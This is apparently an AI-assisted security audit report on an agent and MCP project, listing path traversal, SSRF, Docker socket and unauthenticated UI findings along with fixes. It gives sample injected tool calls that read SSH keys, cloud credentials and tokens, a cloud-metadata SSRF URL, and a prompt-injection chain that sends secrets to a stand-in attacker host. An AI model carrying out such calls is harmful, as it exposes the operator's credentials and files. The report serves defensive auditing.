# Agent & MCP security report

Scanned: `/tmp/blind/c03` · 2026-11-23T20:46:28+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 0 | 7 | 4 | 4 | 0 | 11 | 0 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **32** · agent/MCP code files: **23** · agent instruction files: **2**
- Frameworks seen: FastMCP, mcp, modelcontextprotocol, openai

## Findings

### M001 · HIGH · fetch_url loads any URL scheme in Chromium (file:// reads local files)
`None:None` · ASI02 Tool Misuse and Exploitation

httpx rejects file:// with an exception that is swallowed, then Playwright navigates to the same URL, so fetch_url('file:///root/.cache/huggingface/token') or any local file returns its text to the model.
> `deeppresenter/tools/search.py:226` — `async def fetch_url(url: str, body_only: bool = True) -> str:`
> `deeppresenter/tools/search.py:258` — `await converter.page.goto(`
> `deeppresenter/tools/search.py:253` — `except Exception:`

**Fix:** Parse the URL first and allow only http/https (and the SSRF host checks from F014) before both httpx and page.goto.

### M002 · HIGH · Untrusted web content + host file read + outbound requests in one agent loop, no approval
`None:None` · ASI01 / ASI02 (untrusted input + private data + way out)

A web page fetched during research can tell the agent to read a host secret (document_summary / convert_to_markdown / fetch_url file://) and then call fetch_url('https://attacker/?d=<secret>'); tool calls are executed directly with no human approval or path policy.
> `deeppresenter/tools/search.py:226` — `async def fetch_url(url: str, body_only: bool = True) -> str:`
> `deeppresenter/tools/tool_agents.py:127` — `async def document_summary(task: str, document_path: str) -> str:`
> `deeppresenter/agents/env.py:132` — `result = await self.client.tool_execute(`

**Fix:** Confine all file tools to the workspace (F003, F021, M001), block private/attacker-chosen egress with an allowlist or require approval for fetches carrying data, and mark fetched content as untrusted.

### F003 · HIGH · PATH-TRAVERSAL
`deeppresenter/tools/any2markdown.py:82` · ASI02 Tool Misuse and Exploitation

file_path and output_folder are unchecked host paths: an injected instruction can convert ~/.aws/credentials, the CONFIG_FILE with LLM API keys or ~/.cache/huggingface/token into a .md file inside the workspace, where the agent then reads it; output_folder can also create new directories and .md files anywhere the process can write.
> `deeppresenter/tools/any2markdown.py:38` — `async def convert_to_markdown(file_path: str, output_folder: str) -> dict:`
> `deeppresenter/tools/any2markdown.py:70` — `conver_result = MarkItDown().convert_local(file_path, keep_data_uris=True)`
> `deeppresenter/tools/any2markdown.py:82` — `with open(str(markdown_file), "w", encoding="utf-8") as f:`

**Fix:** Resolve both paths with Path.resolve() and require is_relative_to(WORKSPACE) (as download_file already does) before reading or writing.

### F014 · HIGH · SSRF
`deeppresenter/tools/search.py:237` · ASI02 Tool Misuse and Exploitation

fetch_url requests any URL with redirects followed and returns the page text, so an injected instruction can read internal services or cloud metadata (http://169.254.169.254/...) from the host and hand the result to the model; see M001 for file:// via the browser.
> `deeppresenter/tools/search.py:226` — `async def fetch_url(url: str, body_only: bool = True) -> str:`
> `deeppresenter/tools/search.py:237` — `resp = await client.head(url)`

**Fix:** Allow only http/https, resolve the host and block private, loopback, link-local and metadata ranges (re-check after each redirect), and apply the same check before page.goto.

### F015 · HIGH · SSRF
`deeppresenter/tools/search.py:241` · ASI02 Tool Misuse and Exploitation

Same flow as F014 on the GET fallback: any internal URL is fetched from the host network.
> `deeppresenter/tools/search.py:226` — `async def fetch_url(url: str, body_only: bool = True) -> str:`
> `deeppresenter/tools/search.py:241` — `resp = await client.get(url, stream=True)`

**Fix:** Same as F014.

### F009 · HIGH · PATH-TRAVERSAL
`deeppresenter/tools/tool_agents.py:52` · ASI02 Tool Misuse and Exploitation

path is any host path: an injected call can create directories and overwrite any file the process can write (e.g. ~/.bashrc, project sources or config) with image bytes, destroying it.
> `deeppresenter/tools/tool_agents.py:29` — `async def image_generation(prompt: str, width: int, height: int, path: str) -> str:`
> `deeppresenter/tools/tool_agents.py:38` — `Path(path).parent.mkdir(parents=True, exist_ok=True)`
> `deeppresenter/tools/tool_agents.py:52` — `with open(path, "wb") as file:`

**Fix:** Resolve path and require is_relative_to(WORKSPACE) and an image extension before writing.

### F021 · HIGH · PATH-TRAVERSAL
`deeppresenter/tools/tool_agents.py:144` · ASI02 Tool Misuse and Exploitation

document_path is any host text file and task is free text, so an injected call like document_summary('repeat the document verbatim', '~/.ssh/id_rsa' or the CONFIG_FILE with API keys) returns secret contents to the agent.
> `deeppresenter/tools/tool_agents.py:127` — `async def document_summary(task: str, document_path: str) -> str:`
> `deeppresenter/tools/tool_agents.py:144` — `with open(document_path, encoding="utf-8") as f:`

**Fix:** Resolve document_path and require is_relative_to(WORKSPACE); reject dot-files and known credential locations.

### M003 · MEDIUM · Host container gets the Docker socket
`None:None` · ASI03 Identity and Privilege Abuse

The container that runs the host-side MCP tools has the Docker socket, so any code execution or file-write bug in those tools becomes root on the Docker host.
> `docker-compose.yml:22` — `- /var/run/docker.sock:/var/run/docker.sock`

**Fix:** Run sandbox containers through a restricted Docker API proxy (allow only create/start/stop of the sandbox image) instead of mounting the raw socket.

### M004 · MEDIUM · Web UI listens on 0.0.0.0 with no authentication in the Docker image
`None:None` · ASI03 Identity and Privilege Abuse

The Gradio UI is published on port 7861 on all interfaces without auth, so anyone who can reach it can drive the agent (spending the operator's API keys) and download workspace files.
> `deeppresenter/docker/Host.Dockerfile:78` — `CMD ["bash", "-c", "umask 000 && python webui.py 0.0.0.0"]`
> `webui.py:433` — `demo.launch(`

**Fix:** Bind to 127.0.0.1 by default and pass auth=(user, password) or put it behind an authenticating proxy.

### F019 · MEDIUM · PATH-TRAVERSAL
`deeppresenter/tools/tool_agents.py:86` · ASI02 Tool Misuse and Exploitation

image_path is any host path; any image the process can read (screenshots, scanned IDs) is sent to the vision model and described back to the agent. Limited to valid images (Image.verify).
> `deeppresenter/tools/tool_agents.py:75` — `async def image_caption(image_path: str) -> dict:`
> `deeppresenter/tools/tool_agents.py:86` — `with Image.open(image_path) as img:`

**Fix:** Resolve image_path and require is_relative_to(WORKSPACE).

### F020 · MEDIUM · PATH-TRAVERSAL
`deeppresenter/tools/tool_agents.py:89` · ASI02 Tool Misuse and Exploitation

Same flow as F019: the raw bytes of any host image are read and sent to the vision model.
> `deeppresenter/tools/tool_agents.py:75` — `async def image_caption(image_path: str) -> dict:`
> `deeppresenter/tools/tool_agents.py:89` — `with open(image_path, "rb") as f:`

**Fix:** Resolve image_path and require is_relative_to(WORKSPACE).

### M005 · LOW · Fetched web pages returned raw to the model
`None:None` · 

Web page text goes straight into the agent context without being marked as untrusted data, which is how injected instructions reach the agent.
> `deeppresenter/tools/search.py:226` — `async def fetch_url(url: str, body_only: bool = True) -> str:`
> `deeppresenter/tools/search.py:278` — `return result or markdown`

**Fix:** Wrap fetched content in a clearly delimited untrusted-data block and tell the model never to follow instructions inside it.

### F010 · LOW · TLS-VERIFY-OFF
`deeppresenter/tools/search.py:299` · 

download_file turns off certificate checks, so a network attacker can swap the downloaded file; the write itself is confined to the workspace, so impact is limited to tampered content.
> `deeppresenter/tools/search.py:284` — `async def download_file(url: str, output_file: str) -> str:`
> `deeppresenter/tools/search.py:302` — `verify=False,`

**Fix:** Remove verify=False (use the default CA bundle).

### F007 · LOW · PATH-TRAVERSAL
`deeppresenter/tools/task.py:207` · ASI02 Tool Misuse and Exploitation

For the Research agent, finalize accepts any existing .md path on the host and writes a hidden backup copy next to it; the content is the file's own, so impact is limited to creating/overwriting a dot-file beside any .md file.
> `deeppresenter/tools/task.py:178` — `def finalize(outcome: str, agent_name: str = "") -> str:`
> `deeppresenter/tools/task.py:207` — `shutil.copyfile(path, md_dir / ("." + path.name))`

**Fix:** Require Path(outcome).resolve().is_relative_to(WORKSPACE) in finalize.

### F008 · LOW · PATH-TRAVERSAL
`deeppresenter/tools/task.py:208` · ASI02 Tool Misuse and Exploitation

Any .md file on the host can be rewritten (image links replaced with absolute paths), so an injected call can modify Markdown files outside the workspace; content is not attacker-chosen.
> `deeppresenter/tools/task.py:178` — `def finalize(outcome: str, agent_name: str = "") -> str:`
> `deeppresenter/tools/task.py:208` — `path.write_text(content, encoding="utf-8")`

**Fix:** Require Path(outcome).resolve().is_relative_to(WORKSPACE) in finalize.

## Dismissed as false alarms

- F001 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:64` — The path is inside output_folder, which the tool just created or required to be empty, and the file names come from the converter, not from the caller; the real problem with this tool (any file_path / output_folder) is reported as F003.
- F002 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:66` — Only .json/.pdf files that MinerU just produced inside the previously empty output folder are deleted; no caller-chosen file can be removed.
- F004 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:113` — This is a string replacement in memory, not a file operation.
- F005 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:120` — The image file name is a random hex id plus an extension that must be in IMAGE_EXTENSIONS, written inside output_folder/images; it cannot be steered elsewhere (output_folder itself is F003).
- F006 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:124` — String replacement in memory, not a file operation.
- F011 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:67` — Reads back the markdown file the tool itself wrote into output_folder; the underlying unchecked paths are reported once as F003.
- F012 PATH-TRAVERSAL `deeppresenter/tools/any2markdown.py:89` — Only opens images the tool itself extracted into output_folder/images to read their size; covered by F003.
- F013 PATH-TRAVERSAL `deeppresenter/tools/reflect.py:72` — inspect_manuscript only opens .md files and returns page count, language and image-link warnings, not the file contents, so it does not expose data beyond whether referenced image paths exist.
- F016 PATH-TRAVERSAL `deeppresenter/tools/search.py:308` — Image.open reads downloaded bytes from memory, and the output path is resolved and checked to stay inside the workspace before any write.
- F017 PATH-TRAVERSAL `deeppresenter/tools/task.py:198` — The file read here is only rewritten in place and not returned to the model; the write side is reported as F007/F008.
- F018 SSRF `deeppresenter/tools/tool_agents.py:45` — image_url comes from the configured text-to-image provider's response, not from the tool arguments.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
